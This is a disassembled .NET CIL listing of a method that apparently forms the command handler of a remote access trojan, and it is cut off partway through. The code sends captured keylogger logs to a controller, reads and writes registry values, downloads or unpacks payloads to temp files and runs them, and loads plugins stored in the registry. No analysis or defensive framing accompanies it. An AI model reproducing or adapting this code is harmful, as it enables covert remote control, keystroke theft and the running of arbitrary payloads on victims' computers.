  .method public static void  Ind(uint8[] b) cil managed
  {
    // Code size       3156 (0xc54)
    .maxstack  9
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             int32 V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [mscorlib]System.Exception V_5,
             class [System]System.Net.WebClient V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             uint8[] V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.IO.MemoryStream V_12,
             uint8[] V_13,
             object V_14,
             int32 V_15,
             class [mscorlib]System.IO.MemoryStream V_16,
             class [System.Drawing]System.Drawing.Graphics V_17,
             string V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             class [mscorlib]System.IO.MemoryStream V_20,
             class [System.Drawing]System.Drawing.Bitmap V_21,
             class [System.Drawing]System.Drawing.Bitmap V_22,
             class [mscorlib]System.Exception V_23,
             uint8[] V_24,
             string V_25,
             int32 V_26,
             class [mscorlib]System.IO.MemoryStream V_27,
             class [mscorlib]System.Exception V_28,
             class [System]System.Net.WebClient V_29,
             class [mscorlib]System.Exception V_30,
             class [mscorlib]System.Exception V_31,
             int32 V_32,
             int32 V_33,
             class [mscorlib]System.IO.MemoryStream V_34,
             class [mscorlib]System.Exception V_35,
             class [mscorlib]System.Exception V_36,
             string V_37,
             string V_38,
             string[] V_39,
             object[] V_40,
             string V_41,
             valuetype [System.Drawing]System.Drawing.Rectangle V_42,
             valuetype [System.Drawing]System.Drawing.Rectangle V_43,
             valuetype [System.Drawing]System.Drawing.Rectangle V_44,
             valuetype [System.Drawing]System.Drawing.Rectangle V_45,
             valuetype [System.Drawing]System.Drawing.Rectangle V_46,
             valuetype [System.Drawing]System.Drawing.Rectangle V_47,
             valuetype [System.Drawing]System.Drawing.Rectangle V_48,
             valuetype [System.Drawing]System.Drawing.Size V_49,
             string V_50,
             object[] V_51,
             bool[] V_52)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.s    V_37
      IL_0019:  ldloc.s    V_37
      IL_001b:  ldstr      "ll"
      IL_0020:  ldc.i4.0
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0026:  ldc.i4.0
      IL_0027:  bne.un.s   IL_0034

      IL_0029:  ldc.i4.0
      IL_002a:  stsfld     bool j.OK::Cn
      IL_002f:  leave      IL_0c53

      IL_0034:  ldloc.s    V_37
      IL_0036:  ldstr      "kl"
      IL_003b:  ldc.i4.0
      IL_003c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0041:  ldc.i4.0
      IL_0042:  bne.un.s   IL_006d

      IL_0044:  ldstr      "kl"
      IL_0049:  ldsfld     string j.OK::Y
      IL_004e:  ldsfld     class j.kl j.OK::kq
      IL_0053:  ldflda     string j.kl::Logs
      IL_0058:  call       string j.OK::ENB(string&)
      IL_005d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0062:  call       bool j.OK::Send(string)
      IL_0067:  pop
      IL_0068:  leave      IL_0c53

      IL_006d:  ldloc.s    V_37
      IL_006f:  ldstr      "prof"
      IL_0074:  ldc.i4.0
      IL_0075:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_007a:  ldc.i4.0
      IL_007b:  bne.un     IL_0127

      IL_0080:  ldloc.0
      IL_0081:  ldc.i4.1
      IL_0082:  ldelem.ref
      IL_0083:  stloc.s    V_38
      IL_0085:  ldloc.s    V_38
      IL_0087:  ldstr      "~"
      IL_008c:  ldc.i4.0
      IL_008d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0092:  ldc.i4.0
      IL_0093:  bne.un.s   IL_00a7

      IL_0095:  ldloc.0
      IL_0096:  ldc.i4.2
      IL_0097:  ldelem.ref
      IL_0098:  ldloc.0
      IL_0099:  ldc.i4.3
      IL_009a:  ldelem.ref
      IL_009b:  ldc.i4.1
      IL_009c:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00a1:  pop
      IL_00a2:  leave      IL_0c53

      IL_00a7:  ldloc.s    V_38
      IL_00a9:  ldstr      "!"
      IL_00ae:  ldc.i4.0
      IL_00af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00b4:  ldc.i4.0
      IL_00b5:  bne.un.s   IL_0107

      IL_00b7:  ldloc.0
      IL_00b8:  ldc.i4.2
      IL_00b9:  ldelem.ref
      IL_00ba:  ldloc.0
      IL_00bb:  ldc.i4.3
      IL_00bc:  ldelem.ref
      IL_00bd:  ldc.i4.1
      IL_00be:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00c3:  pop
      IL_00c4:  ldstr      "getvalue"
      IL_00c9:  ldsfld     string j.OK::Y
      IL_00ce:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00d3:  ldloc.0
      IL_00d4:  ldc.i4.1
      IL_00d5:  ldelem.ref
      IL_00d6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00db:  ldsfld     string j.OK::Y
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  ldloc.0
      IL_00e6:  ldc.i4.1
      IL_00e7:  ldelem.ref
      IL_00e8:  ldstr      ""
      IL_00ed:  call       object j.OK::GTV(string,
                                                        object)
      IL_00f2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_00f7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00fc:  call       bool j.OK::Send(string)
      IL_0101:  pop
      IL_0102:  leave      IL_0c53

      IL_0107:  ldloc.s    V_38
      IL_0109:  ldstr      "@"
      IL_010e:  ldc.i4.0
      IL_010f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0114:  ldc.i4.0
      IL_0115:  bne.un     IL_0bbb

      IL_011a:  ldloc.0
      IL_011b:  ldc.i4.2
      IL_011c:  ldelem.ref
      IL_011d:  call       void j.OK::DLV(string)
      IL_0122:  leave      IL_0c53

      IL_0127:  ldloc.s    V_37
      IL_0129:  ldstr      "rn"
      IL_012e:  ldc.i4.0
      IL_012f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0134:  ldc.i4.0
      IL_0135:  bne.un     IL_0294

      IL_013a:  ldloc.0
      IL_013b:  ldc.i4.2
      IL_013c:  ldelem.ref
      IL_013d:  ldc.i4.0
      IL_013e:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0143:  ldc.i4.s   31
      IL_0145:  bne.un.s   IL_01c0

      .try
      {
        IL_0147:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_014c:  stloc.s    V_4
        IL_014e:  ldloc.0
        IL_014f:  ldc.i4.0
        IL_0150:  ldelem.ref
        IL_0151:  ldsfld     string j.OK::Y
        IL_0156:  ldloc.0
        IL_0157:  ldc.i4.1
        IL_0158:  ldelem.ref
        IL_0159:  ldsfld     string j.OK::Y
        IL_015e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0163:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0168:  stloc.3
        IL_0169:  ldloc.s    V_4
        IL_016b:  ldarg.0
        IL_016c:  ldloc.3
        IL_016d:  ldarg.0
        IL_016e:  ldlen
        IL_016f:  conv.ovf.i4
        IL_0170:  ldloc.3
        IL_0171:  sub.ovf
        IL_0172:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0177:  ldloc.s    V_4
        IL_0179:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_017e:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0183:  stloc.1
        IL_0184:  leave      IL_020b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0189:  dup
        IL_018a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_018f:  stloc.s    V_5
        IL_0191:  ldstr      "MSG"
        IL_0196:  ldsfld     string j.OK::Y
        IL_019b:  ldstr      "Execute ERROR"
        IL_01a0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01a5:  call       bool j.OK::Send(string)
        IL_01aa:  pop
        IL_01ab:  ldstr      "bla"
        IL_01b0:  call       bool j.OK::Send(string)
        IL_01b5:  pop
        IL_01b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01bb:  leave      IL_0c53

      }  // end handler
      IL_01c0:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_01c5:  stloc.s    V_6
      .try
      {
        IL_01c7:  ldloc.s    V_6
        IL_01c9:  ldloc.0
        IL_01ca:  ldc.i4.2
        IL_01cb:  ldelem.ref
        IL_01cc:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_01d1:  stloc.1
        IL_01d2:  leave.s    IL_020b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01d4:  dup
        IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01da:  stloc.s    V_7
        IL_01dc:  ldstr      "MSG"
        IL_01e1:  ldsfld     string j.OK::Y
        IL_01e6:  ldstr      "Download ERROR"
        IL_01eb:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01f0:  call       bool j.OK::Send(string)
        IL_01f5:  pop
        IL_01f6:  ldstr      "bla"
        IL_01fb:  call       bool j.OK::Send(string)
        IL_0200:  pop
        IL_0201:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0206:  leave      IL_0c53

      }  // end handler
      IL_020b:  ldstr      "bla"
      IL_0210:  call       bool j.OK::Send(string)
      IL_0215:  pop
      IL_0216:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_021b:  ldstr      "."
      IL_0220:  ldloc.0
      IL_0221:  ldc.i4.1
      IL_0222:  ldelem.ref
      IL_0223:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0228:  stloc.2
      .try
      {
        IL_0229:  ldloc.2
        IL_022a:  ldloc.1
        IL_022b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0230:  ldloc.2
        IL_0231:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0236:  pop
        IL_0237:  ldstr      "MSG"
        IL_023c:  ldsfld     string j.OK::Y
        IL_0241:  ldstr      "Executed As "
        IL_0246:  ldloc.2
        IL_0247:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_024c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0251:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0256:  call       bool j.OK::Send(string)
        IL_025b:  pop
        IL_025c:  leave      IL_0c53

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0261:  dup
        IL_0262:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0267:  stloc.s    V_8
        IL_0269:  ldstr      "MSG"
        IL_026e:  ldsfld     string j.OK::Y
        IL_0273:  ldstr      "Execute ERROR "
        IL_0278:  ldloc.s    V_8
        IL_027a:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_027f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0284:  call       bool j.OK::Send(string)
        IL_0289:  pop
        IL_028a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_028f:  leave      IL_0c53

      }  // end handler
      IL_0294:  ldloc.s    V_37
      IL_0296:  ldstr      "inv"
      IL_029b:  ldc.i4.0
      IL_029c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02a1:  ldc.i4.0
      IL_02a2:  bne.un     IL_04d6

      IL_02a7:  ldloc.0
      IL_02a8:  ldc.i4.1
      IL_02a9:  ldelem.ref
      IL_02aa:  ldc.i4.0
      IL_02ab:  newarr     [mscorlib]System.Byte
      IL_02b0:  call       object j.OK::GTV(string,
                                                        object)
      IL_02b5:  castclass  uint8[]
      IL_02ba:  stloc.s    V_9
      IL_02bc:  ldloc.0
      IL_02bd:  ldc.i4.3
      IL_02be:  ldelem.ref
      IL_02bf:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_02c4:  ldc.i4.s   10
      IL_02c6:  clt
      IL_02c8:  ldloc.s    V_9
      IL_02ca:  ldlen
      IL_02cb:  conv.ovf.i4
      IL_02cc:  ldc.i4.0
      IL_02cd:  ceq
      IL_02cf:  and
      IL_02d0:  brfalse.s  IL_0318

      IL_02d2:  ldc.i4.5
      IL_02d3:  newarr     [mscorlib]System.String
      IL_02d8:  stloc.s    V_39
      IL_02da:  ldloc.s    V_39
      IL_02dc:  ldc.i4.0
      IL_02dd:  ldstr      "pl"
      IL_02e2:  stelem.ref
      IL_02e3:  ldloc.s    V_39
      IL_02e5:  ldc.i4.1
      IL_02e6:  ldsfld     string j.OK::Y
      IL_02eb:  stelem.ref
      IL_02ec:  ldloc.s    V_39
      IL_02ee:  ldc.i4.2
      IL_02ef:  ldloc.0
      IL_02f0:  ldc.i4.1
      IL_02f1:  ldelem.ref
      IL_02f2:  stelem.ref
      IL_02f3:  ldloc.s    V_39
      IL_02f5:  ldc.i4.3
      IL_02f6:  ldsfld     string j.OK::Y
      IL_02fb:  stelem.ref
      IL_02fc:  ldloc.s    V_39
      IL_02fe:  ldc.i4.4
      IL_02ff:  ldc.i4.1
      IL_0300:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0305:  stelem.ref
      IL_0306:  ldloc.s    V_39
      IL_0308:  call       string [mscorlib]System.String::Concat(string[])
      IL_030d:  call       bool j.OK::Send(string)
      IL_0312:  pop
      IL_0313:  leave      IL_0c53

      IL_0318:  ldloc.0
      IL_0319:  ldc.i4.3
      IL_031a:  ldelem.ref
      IL_031b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0320:  ldc.i4.s   10
      IL_0322:  ble.s      IL_039b

      IL_0324:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0329:  stloc.s    V_12
      IL_032b:  ldc.i4.6
      IL_032c:  newarr     [mscorlib]System.String
      IL_0331:  stloc.s    V_39
      IL_0333:  ldloc.s    V_39
      IL_0335:  ldc.i4.0
      IL_0336:  ldloc.0
      IL_0337:  ldc.i4.0
      IL_0338:  ldelem.ref
      IL_0339:  stelem.ref
      IL_033a:  ldloc.s    V_39
      IL_033c:  ldc.i4.1
      IL_033d:  ldsfld     string j.OK::Y
      IL_0342:  stelem.ref
      IL_0343:  ldloc.s    V_39
      IL_0345:  ldc.i4.2
      IL_0346:  ldloc.0
      IL_0347:  ldc.i4.1
      IL_0348:  ldelem.ref
      IL_0349:  stelem.ref
      IL_034a:  ldloc.s    V_39
      IL_034c:  ldc.i4.3
      IL_034d:  ldsfld     string j.OK::Y
      IL_0352:  stelem.ref
      IL_0353:  ldloc.s    V_39
      IL_0355:  ldc.i4.4
      IL_0356:  ldloc.0
      IL_0357:  ldc.i4.2
      IL_0358:  ldelem.ref
      IL_0359:  stelem.ref
      IL_035a:  ldloc.s    V_39
      IL_035c:  ldc.i4.5
      IL_035d:  ldsfld     string j.OK::Y
      IL_0362:  stelem.ref
      IL_0363:  ldloc.s    V_39
      IL_0365:  call       string [mscorlib]System.String::Concat(string[])
      IL_036a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_036f:  stloc.s    V_11
      IL_0371:  ldloc.s    V_12
      IL_0373:  ldarg.0
      IL_0374:  ldloc.s    V_11
      IL_0376:  ldarg.0
      IL_0377:  ldlen
      IL_0378:  conv.ovf.i4
      IL_0379:  ldloc.s    V_11
      IL_037b:  sub.ovf
      IL_037c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0381:  ldloc.s    V_12
      IL_0383:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0388:  call       uint8[] j.OK::ZIP(uint8[])
      IL_038d:  stloc.s    V_9
      IL_038f:  ldloc.0
      IL_0390:  ldc.i4.1
      IL_0391:  ldelem.ref
      IL_0392:  ldloc.s    V_9
      IL_0394:  ldc.i4.3
      IL_0395:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_039a:  pop
      IL_039b:  ldc.i4.5
      IL_039c:  newarr     [mscorlib]System.String
      IL_03a1:  stloc.s    V_39
      IL_03a3:  ldloc.s    V_39
      IL_03a5:  ldc.i4.0
      IL_03a6:  ldstr      "pl"
      IL_03ab:  stelem.ref
      IL_03ac:  ldloc.s    V_39
      IL_03ae:  ldc.i4.1
      IL_03af:  ldsfld     string j.OK::Y
      IL_03b4:  stelem.ref
      IL_03b5:  ldloc.s    V_39
      IL_03b7:  ldc.i4.2
      IL_03b8:  ldloc.0
      IL_03b9:  ldc.i4.1
      IL_03ba:  ldelem.ref
      IL_03bb:  stelem.ref
      IL_03bc:  ldloc.s    V_39
      IL_03be:  ldc.i4.3
      IL_03bf:  ldsfld     string j.OK::Y
      IL_03c4:  stelem.ref
      IL_03c5:  ldloc.s    V_39
      IL_03c7:  ldc.i4.4
      IL_03c8:  ldc.i4.0
      IL_03c9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_03ce:  stelem.ref
      IL_03cf:  ldloc.s    V_39
      IL_03d1:  call       string [mscorlib]System.String::Concat(string[])
      IL_03d6:  call       bool j.OK::Send(string)
      IL_03db:  pop
      IL_03dc:  ldloc.s    V_9
      IL_03de:  ldstr      "A"
      IL_03e3:  call       object j.OK::Plugin(uint8[],
                                                           string)
      IL_03e8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_03ed:  stloc.s    V_10
      IL_03ef:  ldloc.s    V_10
      IL_03f1:  ldnull
      IL_03f2:  ldstr      "h"
      IL_03f7:  ldc.i4.1
      IL_03f8:  newarr     [mscorlib]System.Object
      IL_03fd:  stloc.s    V_40
      IL_03ff:  ldloc.s    V_40
      IL_0401:  ldc.i4.0
      IL_0402:  ldsfld     string j.OK::H
      IL_0407:  stelem.ref
      IL_0408:  ldloc.s    V_40
      IL_040a:  ldnull
      IL_040b:  ldnull
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0411:  ldloc.s    V_10
      IL_0413:  ldnull
      IL_0414:  ldstr      "p"
      IL_0419:  ldc.i4.1
      IL_041a:  newarr     [mscorlib]System.Object
      IL_041f:  stloc.s    V_40
      IL_0421:  ldloc.s    V_40
      IL_0423:  ldc.i4.0
      IL_0424:  ldsfld     string j.OK::P
      IL_0429:  stelem.ref
      IL_042a:  ldloc.s    V_40
      IL_042c:  ldnull
      IL_042d:  ldnull
      IL_042e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0433:  ldloc.s    V_10
      IL_0435:  ldnull
      IL_0436:  ldstr      "osk"
      IL_043b:  ldc.i4.1
      IL_043c:  newarr     [mscorlib]System.Object
      IL_0441:  stloc.s    V_40
      IL_0443:  ldloc.s    V_40
      IL_0445:  ldc.i4.0
      IL_0446:  ldloc.0
      IL_0447:  ldc.i4.2
      IL_0448:  ldelem.ref
      IL_0449:  stelem.ref
      IL_044a:  ldloc.s    V_40
      IL_044c:  ldnull
      IL_044d:  ldnull
      IL_044e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0453:  ldloc.s    V_10
      IL_0455:  ldnull
      IL_0456:  ldstr      "start"
      IL_045b:  ldc.i4.0
      IL_045c:  newarr     [mscorlib]System.Object
      IL_0461:  ldnull
      IL_0462:  ldnull
      IL_0463:  ldnull
      IL_0464:  ldc.i4.1
      IL_0465:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_046a:  pop
      IL_046b:  br.s       IL_0473

      IL_046d:  ldc.i4.1
      IL_046e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0473:  ldsfld     bool j.OK::Cn
      IL_0478:  ldc.i4.0
      IL_0479:  ceq
      IL_047b:  box        [mscorlib]System.Boolean
      IL_0480:  ldloc.s    V_10
      IL_0482:  ldnull
      IL_0483:  ldstr      "Off"
      IL_0488:  ldc.i4.0
      IL_0489:  newarr     [mscorlib]System.Object
      IL_048e:  ldnull
      IL_048f:  ldnull
      IL_0490:  ldnull
      IL_0491:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0496:  ldc.i4.1
      IL_0497:  box        [mscorlib]System.Boolean
      IL_049c:  ldc.i4.0
      IL_049d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_04a2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_04a7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_04ac:  brfalse.s  IL_046d

      IL_04ae:  ldloc.s    V_10
      IL_04b0:  ldnull
      IL_04b1:  ldstr      "off"
      IL_04b6:  ldc.i4.1
      IL_04b7:  newarr     [mscorlib]System.Object
      IL_04bc:  stloc.s    V_40
      IL_04be:  ldloc.s    V_40
      IL_04c0:  ldc.i4.0
      IL_04c1:  ldc.i4.1
      IL_04c2:  box        [mscorlib]System.Boolean
      IL_04c7:  stelem.ref
      IL_04c8:  ldloc.s    V_40
      IL_04ca:  ldnull
      IL_04cb:  ldnull
      IL_04cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_04d1:  leave      IL_0c53

      IL_04d6:  ldloc.s    V_37
      IL_04d8:  ldstr      "ret"
      IL_04dd:  ldc.i4.0
      IL_04de:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04e3:  ldc.i4.0
      IL_04e4:  bne.un     IL_066b

      IL_04e9:  ldloc.0
      IL_04ea:  ldc.i4.1
      IL_04eb:  ldelem.ref
      IL_04ec:  ldc.i4.0
      IL_04ed:  newarr     [mscorlib]System.Byte
      IL_04f2:  call       object j.OK::GTV(string,
                                                        object)
      IL_04f7:  castclass  uint8[]
      IL_04fc:  stloc.s    V_13
      IL_04fe:  ldloc.0
      IL_04ff:  ldc.i4.2
      IL_0500:  ldelem.ref
      IL_0501:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0506:  ldc.i4.s   10
      IL_0508:  clt
      IL_050a:  ldloc.s    V_13
      IL_050c:  ldlen
      IL_050d:  conv.ovf.i4
      IL_050e:  ldc.i4.0
      IL_050f:  ceq
      IL_0511:  and
      IL_0512:  brfalse.s  IL_055a

      IL_0514:  ldc.i4.5
      IL_0515:  newarr     [mscorlib]System.String
      IL_051a:  stloc.s    V_39
      IL_051c:  ldloc.s    V_39
      IL_051e:  ldc.i4.0
      IL_051f:  ldstr      "pl"
      IL_0524:  stelem.ref
      IL_0525:  ldloc.s    V_39
      IL_0527:  ldc.i4.1
      IL_0528:  ldsfld     string j.OK::Y
      IL_052d:  stelem.ref
      IL_052e:  ldloc.s    V_39
      IL_0530:  ldc.i4.2
      IL_0531:  ldloc.0
      IL_0532:  ldc.i4.1
      IL_0533:  ldelem.ref
      IL_0534:  stelem.ref
      IL_0535:  ldloc.s    V_39
      IL_0537:  ldc.i4.3
      IL_0538:  ldsfld     string j.OK::Y
      IL_053d:  stelem.ref
      IL_053e:  ldloc.s    V_39
      IL_0540:  ldc.i4.4
      IL_0541:  ldc.i4.1
      IL_0542:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0547:  stelem.ref
      IL_0548:  ldloc.s    V_39
      IL_054a:  call       string [mscorlib]System.String::Concat(string[])
      IL_054f:  call       bool j.OK::Send(string)
      IL_0554:  pop
      IL_0555:  leave      IL_0c53

      IL_055a:  ldloc.0
      IL_055b:  ldc.i4.2
      IL_055c:  ldelem.ref
      IL_055d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0562:  ldc.i4.s   10
      IL_0564:  ble.s      IL_05b3

      IL_0566:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_056b:  stloc.s    V_16
      IL_056d:  ldloc.0
      IL_056e:  ldc.i4.0
      IL_056f:  ldelem.ref
      IL_0570:  ldsfld     string j.OK::Y
      IL_0575:  ldloc.0
      IL_0576:  ldc.i4.1
      IL_0577:  ldelem.ref
      IL_0578:  ldsfld     string j.OK::Y
      IL_057d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0582:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0587:  stloc.s    V_15
      IL_0589:  ldloc.s    V_16
      IL_058b:  ldarg.0
      IL_058c:  ldloc.s    V_15
      IL_058e:  ldarg.0
      IL_058f:  ldlen
      IL_0590:  conv.ovf.i4
      IL_0591:  ldloc.s    V_15
      IL_0593:  sub.ovf
      IL_0594:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0599:  ldloc.s    V_16
      IL_059b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_05a0:  call       uint8[] j.OK::ZIP(uint8[])
      IL_05a5:  stloc.s    V_13
      IL_05a7:  ldloc.0
      IL_05a8:  ldc.i4.1
      IL_05a9:  ldelem.ref
      IL_05aa:  ldloc.s    V_13
      IL_05ac:  ldc.i4.3
      IL_05ad:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_05b2:  pop
      IL_05b3:  ldc.i4.5
      IL_05b4:  newarr     [mscorlib]System.String
      IL_05b9:  stloc.s    V_39
      IL_05bb:  ldloc.s    V_39
      IL_05bd:  ldc.i4.0
      IL_05be:  ldstr      "pl"
      IL_05c3:  stelem.ref
      IL_05c4:  ldloc.s    V_39
      IL_05c6:  ldc.i4.1
      IL_05c7:  ldsfld     string j.OK::Y
      IL_05cc:  stelem.ref
      IL_05cd:  ldloc.s    V_39
      IL_05cf:  ldc.i4.2
      IL_05d0:  ldloc.0
      IL_05d1:  ldc.i4.1
      IL_05d2:  ldelem.ref
      IL_05d3:  stelem.ref
      IL_05d4:  ldloc.s    V_39
